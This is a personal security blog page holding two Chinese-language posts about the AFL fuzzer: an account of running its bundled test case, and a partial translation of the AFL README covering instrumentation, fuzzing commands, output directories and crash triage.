<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <link rel="manifest" href="/images/manifest.json">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Times New Roman:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"spwpun.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="Sharing, Communicating more, then moving on......">
<meta property="og:type" content="website">
<meta property="og:title" content="Spwpun&#39;s Blog">
<meta property="og:url" content="https://spwpun.github.io/page/2/index.html">
<meta property="og:site_name" content="Spwpun&#39;s Blog">
<meta property="og:description" content="Sharing, Communicating more, then moving on......">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Demen Lee">
<meta property="article:tag" content="Blog, Cyber Security, Info Sec">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://spwpun.github.io/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Spwpun's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Spwpun's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/spwpun" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/06/17/afl-testcase-zero/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Demen Lee">
      <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Spwpun's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/06/17/afl-testcase-zero/" class="post-title-link" itemprop="url">afl testcase zero</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-06-17 11:19:19" itemprop="dateCreated datePublished" datetime="2020-06-17T11:19:19+08:00">2020-06-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-06-18 01:33:35" itemprop="dateModified" datetime="2020-06-18T01:33:35+08:00">2020-06-18</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" itemprop="url" rel="index"><span itemprop="name">漏洞挖掘</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2020/06/17/afl-testcase-zero/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/06/17/afl-testcase-zero/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="Pre"><a href="#Pre" class="headerlink" title="Pre"></a>Pre</h3><p>使用AFL先跑其自带的测试用例。</p>
<h3 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h3><p>安装好的AFL目录如下图所示：</p>
<p><img src="/2020/06/17/afl-testcase-zero/image-20200617155420427.png" alt="image-20200617155420427"></p>
<p>其中的test-instr.c就是测试所用的示例。</p>
<p>需要将其再编译生成插桩后的二进制文件，新建一个test目录，再在里面新建test_in,test_out两个目录，将测试文件复制到该文件夹中，新建一个简单的makefile文件，如下：</p>
<p><img src="/2020/06/17/afl-testcase-zero/image-20200617155850996.png" alt="image-20200617155850996"></p>
<p><img src="/2020/06/17/afl-testcase-zero/image-20200617160014747.png" alt="image-20200617160014747"></p>
<p>然后make编译就能生成二进制插桩后的文件了，一般出现一个提示”core_pattern“的设置错误，这里的话需要设置一下状态：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo su</span><br><span class="line">$ <span class="built_in">echo</span> core &gt; /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>

<p>然后就可以正常跑了，一般执行命令<code>afl-fuzz</code>,可以参阅上一篇文章。</p>
<p>我从中午一直跑到了晚上，也没有发现crash的情况出现，结果在freebuf的一篇文章看到如果“cycles done”的字段颜色为绿色就代表再跑下去也没什么结果了，afl运行的过程一直是个死循环，所以才会一直在跑。</p>
<p><img src="/2020/06/17/afl-testcase-zero/image-20200618010657790.png" alt="image-20200618010657790"></p>
<p>然后我就强行停止了。</p>
<h3 id="Again"><a href="#Again" class="headerlink" title="Again"></a>Again</h3><p>很奇怪的是这是afl自带的测试用例，按道理不应该跑不出来的。于是我又去找了一下社区内前辈的文章来看，借用了其中的一个示例代码，结果就很快跑出该程序的crash情况了。</p>
<p><img src="/2020/06/17/afl-testcase-zero/image-20200618012545922.png" alt="image-20200618012545922"></p>
<p>我特意把两次的输出目录都分开了，两次跑的结果都存在，至于如何分析输出的情况，接下来会继续。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/06/15/afl-readme/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Demen Lee">
      <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Spwpun's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/06/15/afl-readme/" class="post-title-link" itemprop="url">afl readme</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-06-15 09:58:26" itemprop="dateCreated datePublished" datetime="2020-06-15T09:58:26+08:00">2020-06-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-06-17 10:38:50" itemprop="dateModified" datetime="2020-06-17T10:38:50+08:00">2020-06-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" itemprop="url" rel="index"><span itemprop="name">漏洞挖掘</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2020/06/15/afl-readme/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/06/15/afl-readme/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>原文地址：<a target="_blank" rel="noopener" href="https://lcamtuf.coredump.cx/afl/README.txt">https://lcamtuf.coredump.cx/afl/README.txt</a></p>
<h3 id="American-fuzzy-lop"><a href="#American-fuzzy-lop" class="headerlink" title="American fuzzy lop"></a>American fuzzy lop</h3><p>简称AFL，是当下最常用的模糊测试工具，而模糊测试主要用于漏洞挖掘。</p>
<p>由Michal Zalewski <a href="mailto:&#108;&#99;&#x61;&#x6d;&#x74;&#117;&#x66;&#64;&#x67;&#111;&#x6f;&#x67;&#x6c;&#x65;&#x2e;&#99;&#111;&#x6d;">&#108;&#99;&#x61;&#x6d;&#x74;&#117;&#x66;&#64;&#x67;&#111;&#x6f;&#x67;&#x6c;&#x65;&#x2e;&#99;&#111;&#x6d;</a>编写和维护</p>
<p>新版本和更多信息请查阅：<a target="_blank" rel="noopener" href="http://lcamtuf.coredump.cx/afl/">http://lcamtuf.coredump.cx/afl/</a></p>
<p>如果你想获得其他用户的使用笔记或者主要新功能的通知，可以通过电子邮件：<a href="mailto:&#97;&#102;&#108;&#45;&#x75;&#x73;&#101;&#x72;&#x73;&#43;&#115;&#x75;&#98;&#115;&#99;&#114;&#105;&#x62;&#x65;&#x40;&#103;&#111;&#x6f;&#x67;&#x6c;&#101;&#x67;&#x72;&#111;&#117;&#112;&#x73;&#x2e;&#99;&#x6f;&#109;">&#97;&#102;&#108;&#45;&#x75;&#x73;&#101;&#x72;&#x73;&#43;&#115;&#x75;&#98;&#115;&#99;&#114;&#105;&#x62;&#x65;&#x40;&#103;&#111;&#x6f;&#x67;&#x6c;&#101;&#x67;&#x72;&#111;&#117;&#112;&#x73;&#x2e;&#99;&#x6f;&#109;</a></p>
<p>如果你没有时间读完这篇文章，可先查阅”QuickStartGuide.txt”。</p>
<h3 id="1）引导性模糊测试的难点"><a href="#1）引导性模糊测试的难点" class="headerlink" title="1）引导性模糊测试的难点"></a>1）引导性模糊测试的难点</h3><p>Fuzzing是在现实软件中识别安全问题的最强大和被证明的策略之一;到目前为止，在安全关键型软件中发现的绝大多数远程代码执行和提权漏洞都是由它发现的。</p>
<p>不幸的是，fuzzing也相对较浅;盲目的、随机的突变使得它不太可能到达测试代码中的某些代码路径，从而使一些漏洞牢牢地超出了这种技术的范围。</p>
<p>为解决这个问题已作了许多尝试。早期的方法之一——由塔维斯·奥曼蒂开创——是体蒸馏。该方法依靠覆盖信号从大量高质量的候选文件语料库中选择感兴趣的种子子集，然后用传统方法对其进行模糊处理。这种方法非常有效，但需要这样的语料库随时可用。此外，块覆盖度量只提供了对程序状态的一个非常简单的理解，并且在指导长期的模糊工作方面用处不大。</p>
<p>其他更复杂的研究集中在诸如程序流分析(“协同执行”)、符号执行或静态分析等技术上。所有这些方法在实验环境中都非常有前途，但在实际应用中往往存在可靠性和性能问题——而且目前还不能提供“愚蠢的”模糊技术（指模糊测试的盲目性）的可行替代方案。</p>
<h3 id="2）afl-fuzz方法"><a href="#2）afl-fuzz方法" class="headerlink" title="2）afl-fuzz方法"></a>2）afl-fuzz方法</h3><p>AFL是一个蛮力的Fuzzer，它的插桩引导遗传算法极其简单但却很可靠。它使用了一种改进的边缘覆盖形式来捕捉程序控制流中细微的、局部的变化。稍微简化一下，整体算法可总结为：</p>
<blockquote>
<ol>
<li>将用户提供的测试用例加载到队列中</li>
<li>从队列中获取下一个输入文件</li>
<li>尝试将测试用例修剪到最小的不会影响程序的测量行为的大小</li>
<li>使用平衡且经过充分研究的各种传统模糊策略反复修改文件</li>
<li>如果生成的任何突变导致插装记录的新状态转换，则在队列中添加突变的输出作为新条目</li>
<li>返回第2步。</li>
</ol>
</blockquote>
<p>被发现的测试用例也被周期性地剔除，以消除那些被更新的、高覆盖率的发现所淘汰的用例;并继续执行其他几个由工具驱动的工作最小化步骤。</p>
<p>作为模糊处理过程的一个副产品，该工具创建了有趣的测试用例的小型自包含语料库。这对于推广其他劳动或资源密集型的测试机制非常有用——例如，用于压力测试浏览器、办公应用程序、图形套件或闭源工具。</p>
<p>这个Fuzzer经过了全面的测试，提供了开箱即用的功能，这远优于盲目的fuzzing或仅覆盖工具（coverage-only）。</p>
<h3 id="3）用于AFL的插桩程序"><a href="#3）用于AFL的插桩程序" class="headerlink" title="3）用于AFL的插桩程序"></a>3）用于AFL的插桩程序</h3><p>当源代码可用时，可以通过一个伴生工具注入插装，该工具在任何标准的第三方代码构建过程中作为gcc或clang的临时替代品。</p>
<p>插装对性能的影响相当小;与afl-fuzz实现的其他优化相结合，大多数程序可以像使用传统工具一样快速甚至更快地进行模糊处理。</p>
<p>重新编译目标程序的正确方法可能会因构建过程的具体情况而有所不同，但是一种几乎通用的方法是：</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ CC=/path/to/afl/afl-gcc ./configure</span><br><span class="line">$ make clean all</span><br></pre></td></tr></table></figure>
</blockquote>
<p>对于C ++程序，您还需要设置:<code>CXX=/path/to/afl/afl-g++</code>.</p>
<p>可以使用相同的方式使用clang包装器（afl-clang和afl-clang ++）。Clang用户也可能会选择使用更高性能的检测模式，如<code>llvm_mode/README.llvm</code>中所述。</p>
<p>在测试库时，需要找到或编写一个简单的程序，从stdin或文件中读取数据，并将其传递给测试库。在这种情况下，必须将此可执行文件链接到检测库的静态版本，或者确保在运行时加载正确的so文件(通常通过设置LD_LIBRARY_PATH)。最简单的选择是静态构建，通常可以通过:</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ CC=/path/to/afl/afl-gcc ./configure --disable-shared</span><br></pre></td></tr></table></figure>
</blockquote>
<p>在调用“ make”时设置AFL_HARDEN = 1将导致CC包装器自动启用代码强化选项，使其更易于检测简单的内存错误。 Libdislocator，一个AFL附带的帮助程序库（请参阅libdislocator / README.dislocator）也可以帮助发现堆损坏问题。</p>
<p>注：建议ASAN用户查看ASAN.txt文件的注释，以了解重要的警告。</p>
<h3 id="4）二进制程序插桩"><a href="#4）二进制程序插桩" class="headerlink" title="4）二进制程序插桩"></a>4）二进制程序插桩</h3><p>当源代码不可用时，AFL为黑盒二进制文件提供了快速、动态插桩的实验性支持。这是通过一个运行在更少人知道的用户模拟空间的QEMU版本来实现的。</p>
<p>QEMU是一个独立于AFL的项目，但是您可以通过以下操作方便地构建该特性：</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> qemu_mode</span><br><span class="line">$ ./build_qemu_support.sh</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/06/15/afl-readme/image-20200615201618394.png" alt="image-20200615201618394"></p>
<p>额外的命令和注意事项，请查阅：<code>qemu_mode/README.qemu</code>.</p>
<p>这种模式比编译时插桩慢2-5倍，不利于并行化，而且可能还有其他一些奇怪之处。</p>
<h3 id="5）选择初始化测试用例"><a href="#5）选择初始化测试用例" class="headerlink" title="5）选择初始化测试用例"></a>5）选择初始化测试用例</h3><p>要正确操作，fuzzer需要一个或多个启动文件，其中包含目标应用程序通常期望的输入数据的良好示例。有两个基本规则：</p>
<blockquote>
<ol>
<li>保持文件小。1 kB以下是理想的，尽管不是严格必需的。有关为什么尺寸很重要的讨论，请参阅perf tips.txt。</li>
<li>只有当多个测试用例在功能上不同时，才使用它们。使用50张不同的度假照片来模糊一个图片库是没有意义的。</li>
</ol>
</blockquote>
<p>你可以在AFL的安装目录<code>testcases/subdirectory</code>下找到许多很好的启动文件例子。</p>
<p>注：如果有大量数据可用来进行筛选，那么您可能希望使用<code>afl-cmin</code>实用程序来标识功能不同的文件子集，这些文件在目标二进制文件中执行不同的代码路径。</p>
<h3 id="6）模糊测试二进制文件"><a href="#6）模糊测试二进制文件" class="headerlink" title="6）模糊测试二进制文件"></a>6）模糊测试二进制文件</h3><p>模糊过程本身是由afl-fuzz实用程序执行的。这个程序需要一个带有初始测试用例的只读目录，一个单独的地方来存储它的结果，加上要测试的二进制文件的路径。</p>
<p>对于直接接受stdin输入的目标二进制文件，通常的语法是：</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program [...params...]</span><br></pre></td></tr></table></figure>
</blockquote>
<p>对于从文件中获取输入的目标二进制文件，使用‘@@’来标记目标命令行中应该放置输入文件名的位置。然后模糊器会自动为你替换：</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure>
</blockquote>
<p>还可以使用-f选项将变化后的数据写入特定文件。如果程序需要一个特定的文件扩展名，这很有用。</p>
<p>可以在QEMU模式(在命令行中添加-Q)或在传统的盲模糊模式(指定-n)中对未插桩的二进制文件进行模糊处理。</p>
<p>您可以使用-t和-m来覆盖所执行进程的默认超时和内存限制;需要修改这些设置的少数目标包括编译器和视频解码器。</p>
<p>在perf_tips .txt中讨论了优化模糊性能的技巧。</p>
<p>请注意，afl-fuzz首先执行一组确定性模糊步骤，这可能要花费<strong>几天时间</strong>，但往往会生成整洁的测试用例。如果你想马上得到快捷而又不太好的结果——类似于zzuf和其他传统的模糊器——在命令行中添加-d选项。</p>
<h3 id="7）看懂输出的含义"><a href="#7）看懂输出的含义" class="headerlink" title="7）看懂输出的含义"></a>7）看懂输出的含义</h3><p>有关如何解释显示的统计信息和监视进程的运行状况的信息，请参阅status_screen.txt文件。一定要参考这个文件，特别是当任何UI元素用红色突出显示时。</p>
<p>模糊过程会一直执行，直到您按下Ctrl-C。您至少希望允许fuzzer完成一个队列周期，这可能需要几个小时到一周左右的时间。</p>
<p>在输出目录中创建了三个子目录并实时更新：</p>
<blockquote>
<ol>
<li>queue/  每个不同的执行路径的测试用例，加上用户给出的所有启动文件。这是第二节中提到的合成语料库; 在将此语料库用于任何其他目的之前，可以使用afl-cmin工具将其缩小到更小的大小。该工具将找到提供等效边缘覆盖的更小的文件子集。</li>
<li>crashes/  导致被测试程序接收到一个致命的信号的唯一测试用例(例如，SIGSEGV, SIGILL, SIGABRT)。条目根据接收到的信号进行分组。</li>
<li>hangs/   导致被测试程序超时的唯一测试用例。在某些东西被归类为挂起之前的默认时间限制是较大的1秒和-t参数的值。该值可以通过设置AFL_HANG_TMOUT进行微调，但这很少是必要的。</li>
</ol>
</blockquote>
<p>如果相关的执行路径包含以前记录的错误中没有的任何状态转换，那么崩溃和挂起被认为是“唯一的”。如果一个bug可以通过多种方式达到，那么在早期会出现一些计数膨胀，但这种情况应该很快就会消失。</p>
<p>崩溃和挂起的文件名与父的、无故障的队列条目相关。这应该有助于调试。</p>
<p>当您不能重现afl-fuzz发现的崩溃时，最有可能的原因是您没有设置与该工具所使用的相同的内存限制。可以尝试修改以下设置：</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ LIMIT_MB=50</span><br><span class="line">$ ( <span class="built_in">ulimit</span> -Sv $[LIMIT_MB &lt;&lt; <span class="string">10]; /path/to/tested_binary ... )</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>更改LIMIT_MB以匹配传递给afl-fuzz的-m参数。 在OpenBSD上，还将-Sv更改为-Sd。</p>
<p>还可以使用任何现有的输出目录恢复中止的作业。以下：</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./afl-fuzz -i- -o existing_output_dir [...etc...]</span><br></pre></td></tr></table></figure>
</blockquote>
<p>如果安装了gnuplot，则还可以使用afl-plot为任何正在进行活动的模糊测试任务生成漂亮的图形。 举例来说，参见<a target="_blank" rel="noopener" href="http://lcamtuf.coredump.cx/afl/plot/%E3%80%82">http://lcamtuf.coredump.cx/afl/plot/。</a></p>
<h3 id="8）并行模糊测试"><a href="#8）并行模糊测试" class="headerlink" title="8）并行模糊测试"></a>8）并行模糊测试</h3><p>afl-fuzz的每个实例大约占一个核心。这意味着在多核系统上，为了充分利用硬件，必须进行并行。有关如何在多个核或多个联网机器上模糊一个公共目标的技巧，请参阅parallel_fuzzing.txt。</p>
<p>并行模糊模式也提供了一种简单的方法来连接AFL到其他模糊器，符号或共混执行引擎等等; 同样，请参阅parallel_fuzzing.txt的最后一节以获得提示。</p>
<h3 id="9）模糊器字典"><a href="#9）模糊器字典" class="headerlink" title="9）模糊器字典"></a>9）模糊器字典</h3><p>默认情况下，afl-fuzz突变引擎针对紧凑的数据格式进行了优化——例如，图像、多媒体、压缩数据、正则表达式语法或shell脚本。它不太适合那些特别冗长和冗余的语言——尤其是HTML、SQL或JavaScript。</p>
<p>为了避免构建语法感知工具的麻烦，afl-fuzz提供了一种方法，为模糊处理过程提供一个可选的字典，其中包含语言关键字、魔法头或与目标数据类型相关联的其他特殊标记，并使用它们在运行中重构底层语法（参阅：<a target="_blank" rel="noopener" href="http://lcamtuf.blogspot.com/2015/01/afl-fuzz-making-up-grammar-with.html%EF%BC%89%E3%80%82">http://lcamtuf.blogspot.com/2015/01/afl-fuzz-making-up-grammar-with.html）。</a></p>
<p>要使用此功能，您首先需要在两者之一中创建字典dictionaries/README.dictionaries中讨论的格式； 然后通过命令行中的-x选项将模糊器指向它。（在该子目录中也提供了一些常用字典。）</p>
<p>没有办法提供底层语法的更结构化的描述，但是fuzzer可能仅基于插装反馈就能找出其中的一部分。这在实践中是可行的，参阅：<a target="_blank" rel="noopener" href="http://lcamtuf.blogspot.com/2015/04/finding-bugs-in-sqlite-easy-way.html%E3%80%82">http://lcamtuf.blogspot.com/2015/04/finding-bugs-in-sqlite-easy-way.html。</a></p>
<p>注：即使没有给出显式字典，afl-fuzz也会通过在确定的字节翻转期间非常密切地观察插装，尝试从输入语料库中提取现有语法标记。这种方法适用于某些类型的解析器和语法，但不如-x模式好。</p>
<p>如果真的很难获得字典，另一种选择是让AFL运行一段时间，然后使用AFL随附的令牌捕获库。 为此，请参见libtokencap / README.tokencap。</p>
<h3 id="10）崩溃分组"><a href="#10）崩溃分组" class="headerlink" title="10）崩溃分组"></a>10）崩溃分组</h3><p>基于覆盖率的崩溃分组通常会生成一个小数据集，可以手动或使用非常简单的GDB或Valgrind脚本快速筛选该数据集。每个崩溃都可以追溯到队列中的父非崩溃测试用例，从而更容易诊断错误。</p>
<p>话虽如此，重要的是要承认，如果没有大量的调试和代码分析工作，一些模糊崩溃很难快速评估可利用性。为了帮助完成这个任务，afl-fuzz支持一个非常独特的“崩溃探索”模式，启用了-C标志。</p>
<p>在这种模式下，fuzzer将一个或多个崩溃测试用例作为输入，并使用它的反馈驱动的模糊策略来非常快速地枚举程序中可以到达的所有代码路径，同时保持程序处于崩溃状态。</p>
<p>不会导致崩溃的突变被排斥;也不会影响执行路径的更改。</p>
<p>输出是一个小的文件语料库，可以非常快速地检查这些文件，以查看攻击者对错误地址的控制程度，或者是否有可能通过初始越界读取——并查看下面隐藏的内容。</p>
<p>对于测试用例最小化，尝试一下afl-tmin。这个工具操作起来很简单：</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./afl-tmin -i test_case -o minimized_result -- /path/to/program [...]</span><br></pre></td></tr></table></figure>
</blockquote>
<p>该工具对崩溃和非崩溃测试用例同样有效。在崩溃模式下，它将愉快地接受检测和非检测的二进制文件。在非崩溃模式下，最小化器依靠标准的AFL插桩来简化文件，而不改变执行路径。</p>
<p>另一个最近添加到AFL的是AFL分析工具。它接受一个输入文件，尝试按顺序翻转字节，并观察被测试程序的行为。然后，它根据哪些部分看起来是关键的，哪些不是关键的，对输入进行颜色编码;虽然不是很完善，但它通常可以提供对复杂文件格式的快速洞察。更多关于其操作的信息可以在technical_details.txt结尾找到。</p>
